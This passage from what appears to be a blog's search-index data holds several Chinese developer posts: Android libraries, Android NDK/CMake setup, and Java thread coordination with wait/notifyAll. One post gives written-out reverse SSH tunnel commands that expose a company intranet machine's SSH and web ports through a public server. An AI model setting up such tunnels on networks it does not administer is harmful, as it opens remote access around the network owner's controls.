多Fragment”架构而生，简化开发，轻松解决动画、嵌套、事务相关等问题。Github Cosin（loading view）Github AndPermissionGithubAndroid权限申请管理库 SeekCircleGithub Custom Circular SeekBarGithub TimeRuler 时间轴、时间刻度尺Github Equalizer for AndroidGithub FastBootWeixin 微信公众号快速开发框架基于SpringBoot的微信公众号快速开发框架，注解方式处理全部逻辑Github 一款万能遥控器的交互效果Github Android 毛玻璃效果Github BlurryBlurry is an easy blur library for Android. Github BlurKit（目前版本只能在Activity使用，不支持Fragment和Dialog等）模糊图片，提供高斯模糊的遮罩（BlurLayout），随着遮罩下面的内容的变化，高斯模糊效果也会随之改变。[参考](https://juejin.im/post/5a7fec225188257a865d6c30),最新版本为`compile &apos;com.flurgle:blurkit:1.1.1&apos;`，readme上没有更新。 Github Dali需要Java8，模糊图片和View（获取View的Bitmap在处理为图像），可以自动刷新模糊。 Github Gaussian只有模糊图片。 Github BlurDialogFragment处理了整个DialogFragment，适用于模糊整个Fragment。原理就是获取Fragment的Activity的View Bitmap，再处理为模糊。其他的库也差不多这个思想。 …","categories":[{"name":"Github","slug":"Github","permalink":"http://yoursite.com/categories/Github/"}],"tags":[{"name":"github","slug":"github","permalink":"http://yoursite.com/tags/github/"}]},{"title":"利用SSH进行内网穿透","slug":"Linux/利用SSH进行内网穿透","date":"2018-03-14T02:32:31.000Z","updated":"2021-12-28T03:24:10.180Z","comments":true,"path":"Linux/利用SSH进行内网穿透/","link":"","permalink":"http://yoursite.com/Linux/利用SSH进行内网穿透/","excerpt":"","text":"使用场景举例 在家里的电脑用 putty 登录到公司内网的测试服务器 将内网的测试服务（如 HTTP/Git/Svn，只要是基于 TCP 的就行）提供到公网 场景二 还可以通过路由器端口映射转发来实现，但是不是每个人都能控制公司的路由器，没有固定 IP 也是一个麻烦事。另外还可以通过 ngrok 等工具来转发，ngrok 还是有点慢，没有公网服务器时是一个不错的选择。 部署条件 有一台公网服务器，如阿里云的ESC。 部署环境 公网阿里云 ESC，系统 Ubuntu16.04（假设IP：6.6.6.6） 公司内网虚拟机，系统 Ubuntu16.04 服务器（假设IP：192.168.1.88） 场景一 公司虚拟机运行命令 12# 让ESC监听2323端口，并且将该端口的数据转发到本地的22端口$ ssh -gfnNTR 6.6.6.6:2323:localhost:22 root@6.6.6.6 -o ServerAliveInterval=300 在家里的putty连接 6.6.6.6:2323 通过 ESC 的转发，连接到了公司的虚拟机。 场景二 公司虚拟机运行 nginx 监听80端口。 公司虚拟机运行命令 1$ ssh -fNR 6868:localhost:80 root@6.6.6.6 在家里的电脑访问 http://6.6.6.6:6868 通过ESC的转发，可以访问到 nginx 的网页。 参考：实战 SSH 端口转发 参考：内网穿透神器：SSH端口转发","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[{"name":"ssh","slug":"ssh","permalink":"http://yoursite.com/tags/ssh/"}]},{"title":"ElasticSearch的优势","slug":"Web后端/ElasticSearch的优势","date":"2018-02-01T08:11:29.000Z","updated":"2021-12-28T03:24:10.202Z","comments":true,"path":"Web后端/ElasticSearch的优势/","link":"","permalink":"http://yoursite.com/Web后端/ElasticSearch的优势/","excerpt":"","text":"ES非常适用于搜索，速度快，使用简单。 全文搜索——一种传统数据库很难实现的功能 非常容易进行分布式 / 集群部署。 想到再写。 上车","categories":[],"tags":[{"name":"数据库","slug":"数据库","permalink":"http://yoursite.com/tags/数据库/"}]},{"title":"向您的Android项目添加 C 和 C++ 代码","slug":"Android/向您的Android项目添加C和C++代码","date":"2018-01-17T01:52:36.000Z","updated":"2021-12-28T03:24:10.124Z","comments":true,"path":"Android/向您的Android项目添加C和C++代码/","link":"","permalink":"http://yoursite.com/Android/向您的Android项目添加C和C++代码/","excerpt":"","text":"本文是拷贝 google.cn ，更新时间是文章的发表时间。 搭配使用 Android Studio 2.2 或更高版本与 Android Plugin for Gradle 版本 2.2.0 或更高版本时，您可以将 C 和 C++ 代码编译到 Gradle 与 APK 一起打包的原生库中，将这类代码添加到您的应用中。您的 Java 代码随后可以通过 Java 原生接口 (JNI) 调用您的原生库中的函数。如果您想要详细了解如何使用 JNI 框架，请阅读 Android 的 JNI 提示。 Android Studio 用于构建原生库的默认工具是 CMake。由于很多现有项目都使用构建工具包编译其原生代码，Android Studio 还支持 ndk-build。如果您想要将现有的 ndk-build 库导入到您的 Android Studio 项目中，请参阅介绍如何配置 Gradle 以关联到您的原生库的部分。不过，如果您在创建新的原生库，则应使用 CMake。 本页面介绍的信息可以帮助您使用所需构建工具设置 Android Studio、创建或配置项目以支持 Android 上的原生代码，以及构建和运行应用。 注：如果您的现有项目使用已弃用的 ndkCompile 工具，则应先打开 build.properties 文件，并移除以下代码行，然后再将 Gradle 关联到您的原生库： 12// Remove this lineandroid.useDeprecatedNdk = true 实验性 Gradle 的用户注意事项：如果您是以下任意一种情况，请考虑迁移到插件版本 2.2.0 或更高版本并使用 CMake 或 ndk-build 构建原生库：您的原生项目已经使用 CMake 或者 ndk-build；但是您想要使用稳定版本的 Gradle 构建系统；或者您希望支持插件工具，例如 CCache。否则，您可以继续使用实验性版本的 Gradle 和 Android 插件。 下载 NDK 和构建工具要为您的应用编译和调试原生代码，您需要以下组件： Android 原生开发工具包 (NDK)：这套工具集允许您为 Android 使用 C 和 C++ 代码，并提供众多平台库，让您可以管理原生 Activity 和访问物理设备组件，例如传感器和触摸输入。 CMake：一款外部构建工具，可与 Gradle 搭配使用来构建原生库。如果您只计划使用 ndk-build，则不需要此组件。 LLDB：一种调试程序，Android Studio 使用它来调试原生代码。 您可以使用 SDK 管理器安装这些组件： 在打开的项目中，从菜单栏选择 Tools &gt; Android &gt; SDK Manager。 点击 SDK Tools 标签。 选中 LLDB、CMake 和 NDK 旁的复选框，如图 1 所示。 点击 Apply，然后在弹出式对话框中点击 OK。 安装完成后，点击 Finish，然后点击 OK。 创建支持 C/C++ 的新项目创建支持原生代码的项目与创建任何其他 Android Studio 项目类似，不过前者还需要额外几个步骤： 在向导的 Configure your new project 部分，选中 Include C++ Support 复选框。 点击 Next。 正常填写所有其他字段并完成向导接下来的几个部分。 在向导的 Customize C++ Support 部分，您可以使用下列选项自定义项目： C++ Standard：使用下拉列表选择您希望使用哪种 C++ 标准。选择 Toolchain Default 会使用默认的 CMake 设置。 Exceptions Support：如果您希望启用对 C++ 异常处理的支持，请选中此复选框。如果启用此复选框，Android Studio 会将 -fexceptions 标志添加到模块级 build.gradle 文件的 cppFlags 中，Gradle 会将其传递到 CMake。 Runtime Type Information Support：如果您希望支持 RTTI，请选中此复选框。如果启用此复选框，Android Studio 会将 -frtti 标志添加到模块级 build.gradle 文件的 cppFlags 中，Gradle 会将其传递到 CMake。 点击 Finish。在 Android Studio 完成新项目的创建后，请从 IDE 左侧打开 Project 窗格并选择 Android 视图。如图 2 中所示，Android Studio 将添加 cpp 和 External Build Files 组： 注：此视图无法反映磁盘上的实际文件层次结构，而是将相似文件分到一组中，简化项目导航。 在 cpp 组中，您可以找到属于项目的所有原生源文件、标头和预构建库。对于新项目，Android Studio 会创建一个示例 C++ 源文件 native-lib.cpp，并将其置于应用模块的 src/main/cpp/ 目录中。本示例代码提供了一个简单的 C++ 函数 stringFromJNI()，此函数可以返回字符串“Hello from C++”。要了解如何向项目添加其他源文件，请参阅介绍如何 创建新的原生源文件 的部分。 在 External Build Files 组中，您可以找到 CMake 或 ndk-build 的构建脚本。与 build.gradle 文件指示 Gradle 如何构建应用一样，CMake 和 ndk-build 需要一个构建脚本来了解如何构建您的原生库。对于新项目，Android Studio 会创建一个 CMake 构建脚本 CMakeLists.txt，并将其置于模块的根目录中。要详细了解此构建脚本的内容，请参阅介绍如何 创建 Cmake 构建脚本 的部分。 构建和运行示例应用点击 Run 从菜单栏运行应用 后，Android Studio 将在您的 Android 设备或者模拟器上构建并启动一个显示文字“Hello from C++”的应用。下面的概览介绍了构建和运行示例应用时会发生的事件： Gradle 调用您的外部构建脚本 CMakeLists.txt。 CMake 按照构建脚本中的命令将 C++ 源文件 native-lib.cpp 编译到共享的对象库中，并命名为 libnative-lib.so，Gradle 随后会将其打包到 APK 中。 运行时，应用的 MainActivity 会使用 System.loadLibrary() )加载原生库。现在，应用可以使用库的原生函数 stringFromJNI()。 MainActivity.onCreate() 调用 stringFromJNI()，这将返回“Hello from C++”并使用这些文字更新 TextView。 注：Instant Run 与使用原生代码的项目不兼容。Android Studio 会自动停用此功能。 如果您想要验证 Gradle 是否已将原生库打包到 APK 中，可以使用 APK 分析器： 选择 Build &gt; Analyze APK。 从 app/build/outputs/apk/ 目录中选择 APK 并点击 OK。 如图 3 中所示，您会在 APK 分析器窗口的 lib/&lt;ABI&gt;/ 下看到 libnative-lib.so。 提示：如果您想要试验使用原生代码的其他 Android 应用，请点击 File &gt; New &gt; Import Sample 并从 Ndk 列表中选择示例项目。 向现有项目添加 C/C++ 代码如果您希望向现有项目添加原生代码，请执行以下步骤： 创建新的原生源文件并将其添加到您的 Android Studio 项目中。 如果您已经拥有原生代码或想要导入预构建的原生库，则可以跳过此步骤。 创建CMake构建脚本，将您的原生源代码构建到库中。如果导入和关联预构建库或平台库，您也需要此构建脚本。 如果您的现有原生库已经拥有 CMakeLists.txt 构建脚本或者使用 ndk-build 并包含 Android.mk 构建脚本，则可以跳过此步骤。 提供一个指向您的 CMake 或 ndk-build 脚本文件的路径，将 Gradle 关联到您的原生库。Gradle 使用构建脚本将源代码导入您的 Android Studio 项目并将原生库（SO 文件）打包到 APK 中。 配置完项目后，您可以使用 JNI 框架从 Java 代码中访问您的原生函数。要构建和运行应用，只需点击 Run 从菜单栏运行应用。Gradle 会以依赖项的形式添加您的外部原生构建流程，用于编译、构建原生库并将其随 APK 一起打包。 创建新的原生源文件要在应用模块的主源代码集中创建一个包含新建原生源文件的 cpp/ 目录，请按以下步骤操作： 从 IDE 的左侧打开 Project 窗格并从下拉菜单中选择 Project 视图。 导航到 您的模块 &gt; src，右键点击 main 目录，然后选择 New &gt; Directory。 为目录输入一个名称（例如 cpp）并点击 OK。 右键点击您刚刚创建的目录，然后选择 New &gt; C/C++ Source File。 为您的源文件输入一个名称，例如 native-lib。 从 Type 下拉菜单中，为您的源文件选择文件扩展名，例如 .cpp。 点击 Edit File Types ，您可以向下拉菜单中添加其他文件类型，例如 .cxx 或 .hxx。在弹出的 C/C++ 对话框中，从 Source Extension 和 Header Extension下拉菜单中选择另一个文件扩展名，然后点击 OK。 如果您还希望创建一个标头文件，请选中 Create an associated header 复选框。 点击 OK。 创建 CMake 构建脚本如果您的原生源文件还没有 CMake 构建脚本，则您需要自行创建一个并包含适当的 CMake 命令。CMake 构建脚本是一个纯文本文件，您必须将其命名为 CMakeLists.txt。本部分介绍了您应包含到构建脚本中的一些基本命令，用于在创建原生库时指示 CMake 应使用哪些源文件。 注：如果您的项目使用 ndk-build，则不需要创建 CMake 构建脚本。提供一个指向您的 Android.mk 文件的路径，将 Gradle 关联到您的原生库。 要创建一个可以用作 CMake 构建脚本的纯文本文件，请按以下步骤操作： 从 IDE 的左侧打开 Project 窗格并从下拉菜单中选择 Project 视图。 右键点击 您的模块 的根目录并选择 New &gt; File。 注：您可以在所需的任意位置创建构建脚本。不过，在配置构建脚本时，原生源文件和库的路径将与构建脚本的位置相关。 输入“CMakeLists.txt”作为文件名并点击 OK。现在，您可以添加 CMake 命令，对您的构建脚本进行配置。要指示 CMake 从原生源代码创建一个原生库，请将 cmake_minimum_required() 和 add_library() 命令添加到您的构建脚本中： 1234567891011121314151617181920# Sets the minimum version of CMake required to build your native library.# This ensures that a certain set of CMake features is available to# your build.cmake_minimum_required(VERSION 3.4.1)# Specifies a library name, specifies whether the library is STATIC or# SHARED, and provides relative paths to the source code. You can# define multiple libraries by adding multiple add.library() commands,# and CMake builds them for you. When you build your app, Gradle# automatically packages shared libraries with your APK.add_library( # Specifies the name of the library. native-lib # Sets the library as a shared library. SHARED # Provides a relative path to your source file(s). src/main/cpp/native-lib.cpp ) 使用 add_library() 向您的 CMake 构建脚本添加源文件或库时，Android Studio 还会在您同步项目后在 Project 视图下显示关联的标头文件。不过，为了确保 CMake 可以在编译时定位您的标头文件，您需要将 include_directories() 命令添加到 CMake 构建脚本中并指定标头的路径：1234add_library(...)# Specifies a path to native header files.include_directories(src/main/cpp/include/) CMake 使用以下规范来为库文件命名： lib库名称.so例如，如果您在构建脚本中指定“native-lib”作为共享库的名称，CMake 将创建一个名称为 libnative-lib.so 的文件。不过，在 Java 代码中加载此库时，请使用您在 CMake 构建脚本中指定的名称：123static &#123; System.loadLibrary(“native-lib”);&#125; 注：如果您在 CMake 构建脚本中重命名或移除某个库，您需要先清理项目，Gradle 随后才会应用更改或者从 APK 中移除旧版本的库。要清理项目，请从菜单栏中选择 Build &gt; Clean Project。 Android Studio 会自动将源文件和标头添加到 Project 窗格的 cpp 组中。使用多个 add_library() 命令，您可以为 CMake 定义要从其他源文件构建的更多库。 添加 NDK APIAndroid NDK 提供了一套实用的原生 API 和库。通过将 NDK 库包含到项目的 CMakeLists.txt 脚本文件中，您可以使用这些 API 中的任意一种。预构建的 NDK 库已经存在于 Android 平台上，因此，您无需再构建或将其打包到 APK 中。由于 NDK 库已经是 CMake 搜索路径的一部分，您甚至不需要在您的本地 NDK 安装中指定库的位置 - 只需要向 CMake 提供您希望使用的库的名称，并将其关联到您自己的原生库。将 find_library() 命令添加到您的 CMake 构建脚本中以定位 NDK 库，并将其路径存储为一个变量。您可以使用此变量在构建脚本的其他部分引用 NDK 库。以下示例可以定位 Android 特定的日志支持库并将其路径存储在 log-lib 中：1234567find_library( # Defines the name of the path variable that stores the # location of the NDK library. log-lib # Specifies the name of the NDK library that # CMake needs to locate. log ) 为了确保您的原生库可以在 log 库中调用函数，您需要使用 CMake 构建脚本中的 target_link_libraries() 命令关联库：12345678find_library(...)# Links your native library against one or more other native libraries.target_link_libraries( # Specifies the target library. native-lib # Links the log library to the target library. $&#123;log-lib&#125; ) NDK还以源代码的形式包含一些库，您在构建和关联到您的原生库时需要使用这些代码。您可以使用 CMake 构建脚本中的 add_library()命令，将源代码编译到原生库中。要提供本地 NDK库的路径，您可以使用 ANDROID_NDK 路径变量，Android Studio会自动为您定义此变量。 以下命令可以指示 CMake 构建 android_native_app_glue.c，后者会将 NativeActivity 生命周期事件和触摸输入置于静态库中并将静态库关联到 native-lib：123456add_library( app-glue STATIC $&#123;ANDROID_NDK&#125;/sources/android/native_app_glue/android_native_app_glue.c )# You need to link static libraries against your shared native library.target_link_libraries( native-lib app-glue $&#123;log-lib&#125; ) 添加其他预构建库添加预构建库与为 CMake 指定要构建的另一个原生库类似。不过，由于库已经预先构建，您需要使用 IMPORTED 标志告知 CMake 您只希望将库导入到项目中：123add_library( imported-lib SHARED IMPORTED ) 然后，您需要使用 set_target_properties() 命令指定库的路径，如下所示。 某些库为特定的 CPU 架构（或应用二进制接口 (ABI)）提供了单独的软件包，并将其组织到单独的目录中。此方法既有助于库充分利用特定的 CPU 架构，又能让您仅使用所需的库版本。要向 CMake 构建脚本中添加库的多个 ABI 版本，而不必为库的每个版本编写多个命令，您可以使用 ANDROID_ABI 路径变量。此变量使用 NDK 支持的一组默认 ABI，或者您手动配置 Gradle 而让其使用的一组经过筛选的 ABI。例如：123456789add_library(...)set_target_properties( # Specifies the target library. imported-lib # Specifies the parameter you want to define. PROPERTIES IMPORTED_LOCATION # Provides the path to the library you want to import. imported-lib/src/$&#123;ANDROID_ABI&#125;/libimported-lib.so ) 为了确保 CMake 可以在编译时定位您的标头文件，您需要使用 include_directories() 命令，并包含标头文件的路径：1include_directories( imported-lib/include/ ) 注：如果您希望打包一个并不是构建时依赖项的预构建库（例如在添加属于 imported-lib 依赖项的预构建库时），则不需要执行以下说明来关联库。要将预构建库关联到您自己的原生库，请将其添加到 CMake 构建脚本的 target_link_libraries() 命令中：1target_link_libraries( native-lib imported-lib app-glue $&#123;log-lib&#125; ) 在您构建应用时，Gradle 会自动将导入的库打包到 APK 中。您可以使用 APK 分析器验证 Gradle 将哪些库打包到您的 APK 中。如需了解有关 CMake 命令的详细信息，请参阅 CMake文档 将 Gradle 关联到您的原生库要将 Gradle 关联到您的原生库，您需要提供一个指向 CMake 或 ndk-build 脚本文件的路径。在您构建应用时，Gradle 会以依赖项的形式运行 CMake 或 ndk-build，并将共享的库打包到您的 APK 中。Gradle 还使用构建脚本来了解要将哪些文件添加到您的 Android Studio 项目中，以便您可以从 Project 窗口访问这些文件。如果您的原生源文件没有构建脚本，则需要先创建 CMake 构建脚本，然后再继续。 将 Gradle 关联到原生项目后，Android Studio 会更新 Project 窗格以在 cpp 组中显示您的源文件和原生库，在 External Build Files 组中显示您的外部构建脚本。 注：更改 Gradle 配置时，请确保通过点击工具栏中的 Sync Project 应用更改。此外，如果在将 CMake 或 ndk-build 脚本文件关联到 Gradle 后再对其进行更改，您应当从菜单栏中选择 Build &gt; Refresh Linked C++ Projects，将 Android Studio 与您的更改同步。 使用 Android Studio UI您可以使用 Android Studio UI 将 Gradle 关联到外部 CMake 或 ndk-build 项目： 从 IDE 左侧打开 Project 窗格并选择 Android 视图。 右键点击您想要关联到原生库的模块（例如 app模块），并从菜单中选择 Link C++ Project with Gradle。您应看到一个如图 4 所示的对话框。 从下拉菜单中，选择 CMake 或 ndk-build。 a. 如果您选择 CMake，请使用 Project Path 旁的字段为您的外部 CMake 项目指定 CMakeLists.txt 脚本文件。 b. 如果您选择 ndk-build，请使用 Project Path 旁的字段为您的外部 ndk-build 项目指定 Android.mk 脚本文件。如果 Application.mk 文件与您的 Android.mk 文件位于相同目录下，Android Studio 也会包含此文件。 手动配置 Gradle要手动配置 Gradle 以关联到您的原生库，您需要将 externalNativeBuild {} 块添加到模块级 build.gradle 文件中，并使用 cmake {} 或 ndkBuild {} 对其进行配置：12345678910111213141516android &#123; ... defaultConfig &#123;...&#125; buildTypes &#123;...&#125; // Encapsulates your external native build configurations. externalNativeBuild &#123; // Encapsulates your CMake build configurations. cmake &#123; // Provides a relative path to your CMake build script. path &quot;CMakeLists.txt&quot; &#125; &#125;&#125; 注：如果您想要将 Gradle 关联到现有 ndk-build 项目，请使用 ndkBuild {} 块而不是 cmake {}，并提供 Android.mk 文件的相对路径。如果 Application.mk 文件与您的 Android.mk 文件位于相同目录下，Gradle 也会包含此文件。 指定可选配置您可以在模块级 build.gradle 文件的 defaultConfig {}块中配置另一个 externalNativeBuild {} 块，为 CMake 或 ndk-build 指定可选参数和标志。与 defaultConfig {}块中的其他属性类似，您也可以在构建配置中为每个产品风味重写这些属性。 例如，如果您的 CMake 或 ndk-build 项目定义多个原生库，您可以使用 targets属性仅为给定产品风味构建和打包这些库中的一部分。以下代码示例说明了您可以配置的部分属性：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758android &#123; ... defaultConfig &#123; ... // This block is different from the one you use to link Gradle // to your CMake or ndk-build script. externalNativeBuild &#123; // For ndk-build, instead use ndkBuild &#123;&#125; cmake &#123; // Passes optional arguments to CMake. arguments &quot;-DANDROID_ARM_NEON=TRUE&quot;, &quot;-DANDROID_TOOLCHAIN=clang&quot; // Sets optional flags for the C compiler. cFlags &quot;-D_EXAMPLE_C_FLAG1&quot;, &quot;-D_EXAMPLE_C_FLAG2&quot; // Sets a flag to enable format macro constants for the C++ compiler. cppFlags &quot;-D__STDC_FORMAT_MACROS&quot; &#125; &#125; &#125; buildTypes &#123;...&#125; productFlavors &#123; ... demo &#123; ... externalNativeBuild &#123; cmake &#123; ... // Specifies which native libraries to build and package for this // product flavor. If you don&apos;t configure this property, Gradle // builds and packages all shared object libraries that you define // in your CMake or ndk-build project. targets &quot;native-lib-demo&quot; &#125; &#125; &#125; paid &#123; ... externalNativeBuild &#123; cmake &#123; ... targets &quot;native-lib-paid&quot; &#125; &#125; &#125; &#125; // Use this block to link Gradle to your CMake or ndk-build script. externalNativeBuild &#123; cmake &#123;...&#125; // or ndkBuild &#123;...&#125; &#125;&#125; 要详细了解配置产品风味和构建变体，请参阅配置构建变体。如需了解您可以使用 arguments 属性为 CMake 配置的变量列表，请参阅使用 CMake 变量。 指定 ABI默认情况下，Gradle 会针对 NDK 支持的 ABI 将您的原生库构建到单独的 .so 文件中，并将其全部打包到您的 APK 中。如果您希望 Gradle 仅构建和打包原生库的特定 ABI 配置，您可以在模块级 build.gradle 文件中使用 ndk.abiFilters标志指定这些配置，如下所示：12345678910111213141516171819android &#123; ... defaultConfig &#123; ... externalNativeBuild &#123; cmake &#123;...&#125; // or ndkBuild &#123;...&#125; &#125; ndk &#123; // Specifies the ABI configurations of your native // libraries Gradle should build and package with your APK. abiFilters &apos;x86&apos;, &apos;x86_64&apos;, &apos;armeabi&apos;, &apos;armeabi-v7a&apos;, &apos;arm64-v8a&apos; &#125; &#125; buildTypes &#123;...&#125; externalNativeBuild &#123;...&#125;&#125; 在大多数情况下，您只需要在 ndk {} 块中指定 abiFilters（如上所示），因为它会指示 Gradle 构建和打包原生库的这些版本。不过，如果您希望控制 Gradle 应当构建的配置，并独立于您希望其打包到 APK 中的配置，请在 defaultConfig.externalNativeBuild.cmake {} 块（或 defaultConfig.externalNativeBuild.ndkBuild {} 块中）配置另一个 abiFilters 标志。Gradle 会构建这些 ABI 配置，不过仅会打包您在 defaultConfig.ndk{}块中指定的配置。 为了进一步降低 APK 的大小，请考虑配置 ABI APK 拆分，而不是创建一个包含原生库所有版本的大型 APK，Gradle 会为您想要支持的每个 ABI 创建单独的 APK，并且仅打包每个 ABI 需要的文件。如果您配置 ABI 拆分，但没有像上面的代码示例一样指定 abiFilters 标志，Gradle 会构建原生库的所有受支持 ABI 版本，不过仅会打包您在 ABI 拆分配置中指定的版本。为了避免构建您不想要的原生库版本，请为 abiFilters 标志和 ABI 拆分配置提供相同的 ABI 列表。","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"ndk","slug":"ndk","permalink":"http://yoursite.com/tags/ndk/"}]},{"title":"SmartLink和AirKiss原理解析","slug":"WiFi/SmartLink和AirKiss原理解析","date":"2018-01-12T01:52:36.000Z","updated":"2021-12-28T03:24:10.220Z","comments":true,"path":"WiFi/SmartLink和AirKiss原理解析/","link":"","permalink":"http://yoursite.com/WiFi/SmartLink和AirKiss原理解析/","excerpt":"","text":"简单分析当前主流IOT的WiFi方案Smartlink 从原理上讲,只要芯片驱动支持开启混杂模式(WiFi Promiscuous),就可以支持一键配网功能,只是各个厂家叫法及实现编码方式不同而已。 SmartLink传送门 AirKiss传送门","categories":[{"name":"WiFi","slug":"WiFi","permalink":"http://yoursite.com/categories/WiFi/"}],"tags":[]},{"title":"Java编程思想之并发-线程之间的协作","slug":"Java/Java编程思想之并发-线程之间的协作","date":"2017-12-29T01:52:36.000Z","updated":"2017-12-29T01:52:36.000Z","comments":true,"path":"Java/Java编程思想之并发-线程之间的协作/","link":"","permalink":"http://yoursite.com/Java/Java编程思想之并发-线程之间的协作/","excerpt":"","text":"注意：本文来自chaodongyang.com，点击阅读原文 java编程思想之并发(线程之间的协作)当你使用多线程来同时运行多个任务时，可以通过使用锁来同步两个任务的行为，从而使的一个任务不会干涉另一个任务的资源。也就是说，如果两个任务交替的步入某项共享资源，你可以使用互斥来保证任何时刻只有一个任务可以访问这项资源。 线程之间的协作上面的问题已经解决了，下一步是如何使得任务彼此之间可以协作，使得多个任务可以一起工作去解决某个问题。现在的问题不是彼此之间的干涉，而是彼此之间的协作。解决这类问题的关键是某些部分必须在其他部分被解决之前解决。当任务协作时，关键问题是这些任务之间的握手。为了实现握手，我们使用了相同的基础特性：互斥。在这种情况下，互斥能够确保只有一个任务可以响应某个信号，这样就能根除任何可能的竞争条件。在互斥上，我们为任务添加了一种途径，可以将自身挂起，直至某些外部条件发生变化，表示是时候让这个任务开始为止。 wait() 与 notifyAll()wait() 可以使你等待某个条件发生变化，而改变这个条件通常是由另一个任务来改变。你肯定不想在你的任务测试这个条件的同时，不断的进行空循环，这被称为忙等待，是一种不良的 cpu 使用方式。因此 wait() 会在外部条件发生变化的时候将任务挂起，并且只有在 notif() 或 notifAll() 发生时，这个任务才会被唤醒并去检查所发生的变化。因此，wait() 提供了一种在任务之间对活动同步的方式。调用 sleep() 时候锁并没有被释放，调用 yield() 也是一样。当一个任务在方法里遇到对 wait() 调用时，线程执行被挂起，对象的锁被释放。这就意味着另一个任务可以获得锁，因此在改对象中的其他 synchronized 方法可以在 wait() 期间被调用。因此，当你在调用 wait() 时，就是在声明：“我已经做完了所有的事情，但是我希望其他的 synchronized 操作在条件何时的情况下能够被执行”。有两种形式的 wait(): 第一种接受毫秒作为参数:指再次暂停的时间。 在 wait() 期间对象锁是被释放的。 可以通过 notif() 或 notifAll()，或者指令到期，从 wait() 中恢复执行。 第二种不接受参数的 wait(). 这种 wait() 将无线等待下去，直到线程接收到 notif() 或 notifAll()。 wait()、notif()以及 notifAll() 有一个比较特殊的方面，那就是这些方法是基类 Object 的一部分，而不是属于 Thread 类。仅仅作为线程的功能却成为了通用基类的一部分。原因是这些方法操作的锁，也是所有对象的一部分。所以你可以将 wait() 放进任何同步控制方法里，而不用考虑这个类是继承自 Thread 还是 Runnable。实际上，只能在同步方法或者同步代码块里调用 wait()、notif() 或者 notifAll()。如果在非同步代码块里操作这些方法，程序可以通过编译，但是在运行时会得到 IllegalMonitorStateException 异常。意思是，在调用 wait()、notif() 或者 notifAll() 之前必须拥有获取对象的锁。比如，如果向对象 x 发送 notifAll()，那就必须在能够得到 x 的锁的同步控制块中这么做： 123synchronized(x)&#123; x.notifAll();&#125; 我们看一个示例：一个是将蜡涂到 Car 上，一个是抛光它。抛光任务在涂蜡任务完成之前，是不能执行其工作的，而涂蜡任务在涂另一层蜡之前必须等待抛光任务完成。 12345678910111213141516171819202122232425262728293031public class Car &#123; //涂蜡和抛光的状态 private boolean waxOn = false; //打蜡 public synchronized void waxed() &#123; waxOn = true; notifyAll(); &#125; //抛光 public synchronized void buffed() &#123; waxOn = false; notifyAll(); &#125; //抛光结束被挂起即将开始打蜡任务 public synchronized void waitForWaxing() throws InterruptedException&#123; while (waxOn == false) &#123; wait(); &#125; &#125; //打蜡结束被挂起即将开始抛任务 public synchronized void waitForBuffing() throws InterruptedException&#123; while (waxOn == true) &#123; wait(); &#125; &#125;&#125; 开始打蜡的任务：12345678910111213141516171819202122232425262728public class WaxOn implements Runnable&#123; private Car car; protected WaxOn(Car car) &#123; super(); this.car = car; &#125; @Override public void run() &#123; try &#123; while (!Thread.interrupted()) &#123; System.out.println(\"Wax one\"); TimeUnit.MICROSECONDS.sleep(200); //开始打蜡 car.waxed(); //当前任务被挂起 car.waitForBuffing(); &#125; &#125; catch (InterruptedException e) &#123; // TODO Auto-generated catch block System.out.println(\" Exiting via interrupt\"); &#125; System.out.println(\"Ending wax on task\"); &#125;&#125; 开始抛光的任务：1234567891011121314151617181920212223242526272829public class WaxOff implements Runnable&#123; private Car car; protected WaxOff(Car car) &#123; super(); this.car = car; &#125; @Override public void run() &#123; // TODO Auto-generated method stub try &#123; while (!Thread.interrupted()) &#123; //如果还是在打蜡就挂起 car.waitForWaxing(); System.out.println(\"Wax off\"); TimeUnit.MICROSECONDS.sleep(200); //开始抛光 car.buffed(); &#125; &#125; catch (InterruptedException e) &#123; // TODO Auto-generated catch block System.out.println(\"Wxtiing via interrupt\"); &#125; System.out.println(\"Ending wax off task\"); &#125;&#125; 测试类：123456789101112131415public class WaxOmatic &#123; public static void main(String[] args) throws Exception&#123; // TODO Auto-generated method stub Car car = new Car(); ExecutorService service = Executors.newCachedThreadPool(); service.execute(new WaxOff(car)); service.execute(new WaxOn(car)); //暂停2秒钟 TimeUnit.SECONDS.sleep(1); //关闭所有的任务 service.shutdownNow(); &#125;&#125; 执行结果：12345678910Wax oneWax offWax oneWax offWax oneWax offExiting via interruptWxtiing via interruptEnding wax on taskEnding wax off task 在 waitForWaxing() 中检查 WaxOn 标志，如果它是 false，那么这个调用任务将会被挂起。这个行为发生在 synchronized 方法中这一点很重要。因为在这个方法中任务已经获得了锁。当你调用 wait() 时，线程被挂起，而锁被释放。释放锁是本质所在，因为为了安全的改变对象的状态，其他某个任务就必须能够获得这个锁。WaxOn.run() 表示给汽车打蜡的第一个步骤，它执行他的操作：调用 sleep() 模拟打蜡的时间，然后告知汽车打蜡结束，并且调用 waitForWaxing(),这个方法会调用 wait() 挂起当前打蜡的任务。直到 WaxOff 任务调用这两车的 buffed(),从而改变状态并且调用 notfiAll() 重新唤醒为止。翻过来也是一样的，在运行程序时，你可以看到控制权在两个任务之间来回的传递，这两个步骤过程在不断的重复。 错失的信号 当两个线程使用 notif()/wait() 或者 notifAll()/wait() 进行协作时，有可能会错过某个信号。假设线程 T1 是通知 T2 的线程，而这两个线程都使用下面的方式实现： 1234567891011121314T1:synchronized(X)&#123; //设置 T2 的一个条件 &lt;setup condition for T2&gt; x.notif();&#125;T2:while(someCondition)&#123; //Potit synchronized(x)&#123; x.wait(); &#125;&#125; 以上的例子假设 T2 对 someCondition 发现其为 true()。在执行 Potit 其中线程调度器可能切换到了 T1。而 T1 将会执行重新设置 condition，并且调用唤醒。当 T2 继续执行时，以至于不能意识到条件已经发生变化，因此会盲目的进入 wait()。此时唤醒在之前已经调用过了，而 T2 将无限的等待下去唤醒的信号。解决该问题的方案是防止 someCondition 变量上产生竞争条件： 12345synchronized(x)&#123; while(someCondition)&#123; x.wait(); &#125;&#125; notif() 与 notifAll()可能有多个任务在单个 Car 对象上被挂起处于 wait() 状态，因此调用 notifyAll() 比调用 notify() 更安全。使用 notify() 而不是 notifyAll() 是一种优化。使用 notify() 时，在众多等待同一个锁的任务中只有一个被唤醒，因此如果你希望使用 notify()，就必须保证被唤醒的是恰当的任务。另外使用 notify() 